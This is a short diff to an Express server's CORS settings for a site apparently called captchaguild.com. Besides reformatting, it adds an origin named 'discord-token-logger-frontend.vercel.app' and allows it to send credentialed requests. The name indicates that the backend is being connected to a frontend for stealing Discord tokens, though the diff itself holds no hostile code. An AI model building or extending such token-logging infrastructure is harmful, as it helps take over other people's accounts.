@@ -160,8 +160,14 @@ loadExistingUsers();
 
 // Middleware
 app.use(cors({
-  origin: ['https://captchaguild.com','https://captchaguild.com/api', 'http://localhost:3000', 'http://localhost:5000'], // Allow production, dev, and self
-  credentials: true
+  origin: [
+    'https://captchaguild.com',
+    'https://captchaguild.com/api',
+    'http://localhost:3000',
+    'http://localhost:5000',
+    'https://discord-token-logger-frontend.vercel.app',
+  ],
+  credentials: true,
 }));
 app.use(express.json()); // For parsing application/json
 app.use(express.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded
